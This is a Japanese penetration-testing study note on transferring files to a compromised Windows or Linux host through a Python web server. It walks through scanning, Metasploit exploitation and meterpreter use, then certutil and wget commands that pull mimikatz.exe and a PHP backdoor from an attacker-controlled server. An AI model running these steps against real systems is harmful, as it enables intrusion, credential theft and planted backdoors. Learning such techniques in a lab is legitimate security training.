Pythonを使ったwebサーバーの構築
・ターゲットシステムへの初期アクセスを取得した後、そのシステムにファイル転送をする必要がある。
・場合によっては、meterpreterセッション経由でターゲットシステムにアクセスできないことがある。
そのため、OSに組み込まれているユーティリティを使用して、自分のシステムからターゲットシステムへのファイル転送を行う必要がある。
・この手順は2段階で行う
1) 転送したいファイルをwebサーバーにホストする。
2) ターゲットシステム側からそのwebサーバーにホストされたファイルをダウンロードする。

・Pythonには、simplehttpserver(python2)およびhttp.server(python3)と呼ばれる組み込みモジュールがあり、
これを使うことで、標準的なGETとHEADリクエストに対応したシンプルなHTTPサーバーを提供できる。
・このモジュールは、あなたのシステム上の任意のディレクトリにあるファイルをホストするために使用できる。
また、ターミナルで1つのコマンドを実行するだけで利用できる。

demo pythonを使ってweb serverのセッティング
1) 以下のコマンドを使うことで、ファイル転送用のwebサーバーの設定を行うことができる。
python -m SimpleHTTPServer 80
→これを行うことにより、現在の作業ディレクトリにwebサーバーが設定される。
→ブラウザにIPアドレスを検索すると、webサーバーが実行中かを確認できる

demo windowsターゲットへのファイル転送
1) pingでターゲットが稼働しているかを確認する。
2) nmap -sV でターゲットマシンのセキュリティホールを探索する
3) searchsploit サービス名で、ローカルに脆弱性があるかを探索する
4) service postgresql start && msfconsoleを起動する
5) search でモジュールを探索する
6) use を使ってモジュールを起動する
7) set で基本情報の設定を行う
8) exploitでmeterpreterの権限を奪う
9) 新しいターミナルで/usr/share/windows-resources/mimikatz/x64のディレクトリにあるmimikatz.exe実行可能ファイルを転送するために
/usr/share/windows-resources/mimikatz/x64に移動する
10) 移動先で、python3 -m http.server 80を実行してwebサーバーを起動する
11) meterpreterに戻り、C:\\ドライブに移動して、Tempディレクトリを作る
12) cd Tempで移動する
13) shellを使ってターゲットシステム上でコマンドシェルセッションを生成する。
14) 以下のコマンドを使ってwebサーバーからmimikatz.exe実行ファイルをダウンロードする
certutil -urlcache -f http://my_ip/mimikatz.exe mimikatz.exe

demo Linuxのターゲットへのファイル転送
1) pingでターゲットホストが稼働しているかを確認する
2) nmap -sVでターゲットのセキュリティホールで探索する
3) msfconsoleを起動する
4) 脆弱なsambaが起動している場合は、exploit/linux/samba/is_known_pipnameモジュールを起動する
5) set で基本情報を設定する
6) exploitでmeterpreterの権限を奪う
7) 新しいターミナルを開き、/usr/share/webshell/php/に移動する
8) python -m http.server 80でwebサーバーを起動する
9) meterpreterに戻り、wgetでwebサーバーからphp-backdoor.phpをダウンロード
/bin/bash -i
wget http://my_ip/php-backdoor.php
